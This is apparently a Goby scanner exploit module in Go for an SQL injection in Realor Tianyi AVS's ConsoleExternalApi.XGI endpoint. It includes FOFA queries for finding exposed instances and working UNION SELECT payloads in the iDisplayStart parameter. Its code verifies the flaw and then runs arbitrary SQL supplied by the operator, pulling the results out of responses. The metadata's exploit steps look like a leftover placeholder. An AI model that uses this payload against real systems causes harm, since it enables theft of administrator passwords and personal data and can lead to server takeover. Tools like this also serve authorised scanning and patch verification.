package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Realor Tianyi AVS ConsoleExternalApi.XGI file SQL Injection vulnerability",
    "Description": "<p>Realor Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture. It centrally deploys various user application software to the Ruiyou Tianyi service cluster, and clients can access authorized application software on the server through the WEB, achieving centralized application, remote access, collaborative office, and more.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "REALOR-Tianyi-AVS",
    "Homepage": "http://www.realor.cn/",
    "DisclosureDate": "2023-05-09",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title=\"瑞友天翼－应用虚拟化系统\" || title=\"瑞友应用虚拟化系统\" || body=\"static/images/bulletin_qrcode.png\"",
    "GobyQuery": "title=\"瑞友天翼－应用虚拟化系统\" || title=\"瑞友应用虚拟化系统\" || body=\"static/images/bulletin_qrcode.png\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"http://www.realor.cn/product/tianyi/\">http://www.realor.cn/product/tianyi/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "createSelect",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "瑞友天翼应用虚拟化系统 ConsoleExternalApi.XGI 文件 iDisplayStart 参数 SQL 注入漏洞",
            "Product": "REALOR-天翼应用虚拟化系统",
            "Description": "<p>瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过WEB即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>目前官方已发布安全补丁进行漏洞修复：<a href=\"http://www.realor.cn/product/tianyi/\" target=\"_blank\">http://www.realor.cn/product/tianyi/</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Realor Tianyi AVS ConsoleExternalApi.XGI file SQL Injection vulnerability",
            "Product": "REALOR-Tianyi-AVS",
            "Description": "<p>Realor Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture. It centrally deploys various user application software to the Ruiyou Tianyi service cluster, and clients can access authorized application software on the server through the WEB, achieving centralized application, remote access, collaborative office, and more.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "Recommendation": "<p>The official security patch has been released for vulnerability repair: <a href=\"http://www.realor.cn/product/tianyi/\" target=\"_blank\">http://www.realor.cn/product/tianyi/</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10778"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			now := time.Now()
			randomStr := strconv.FormatInt(now.Unix(), 10)
			uri := "/ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5,md5(" + randomStr + ")%23"
			resp, err := httpclient.SimpleGet(hostinfo.FixedHostInfo + uri)
			if err != nil {
				return false
			}
			return strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["attackType"].(string) == "sql" {
				sql := stepLogs.Params["sql"].(string)
				uri := "/ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5," + sql + "%23"
				resp, _ := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri)
				if resp.StatusCode == 200 {
					reg, _ := regexp.Compile(`stoptime":"(.*?)"}]}`)
					result := reg.FindStringSubmatch(resp.Utf8Html)
					if len(result) >= 1 {
						if strings.Contains(result[1], "stoptime") {
							reg2, _ := regexp.Compile(`","stoptime":"(.*)`)
							result2 := reg2.FindStringSubmatch(result[1])
							if len(result2) >= 1 {
								expResult.Success = true
								expResult.Output = result2[1]
							}
						} else {
							expResult.Success = true
							expResult.Output = result[1]
						}
					}
				}
			} else if stepLogs.Params["attackType"].(string) == "sqlPoint" {
				now := time.Now()
				randomStr := strconv.FormatInt(now.Unix(), 10)
				uri := "/ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5,md5(" + randomStr + ")%23"
				resp, _ := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri)
				if strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr)))) {
					payload := expResult.HostInfo.FixedHostInfo + `/ConsoleExternalApi.XGI?key=inner&initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&sign=0a3d5f4f69628f32217ea9704d12bd6d&iDisplayStart=1+union+select+1,2,3,4,5,YourPayload%23`
					expResult.Output = payload
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
